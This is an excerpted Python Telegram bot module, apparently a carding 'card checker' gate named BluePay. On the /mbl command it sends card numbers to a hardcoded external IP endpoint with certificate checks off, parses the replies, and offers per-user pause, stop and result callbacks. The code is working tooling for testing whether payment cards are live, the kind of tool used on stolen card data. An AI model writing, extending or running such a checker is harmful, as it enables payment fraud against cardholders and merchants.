...
GATE_NAME = "BluePay"
GATE_CMD = "mbl"
BL_API = "http://5.83.136.66:8002/bluepay?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(BL_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
@router.message(Command("mbl"))
async def mbl_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mbl_card_"))
async def mbl_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mbl_response_"))
async def mbl_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mbl_stop_"))
async def mbl_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mbl_pause_"))
async def mbl_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
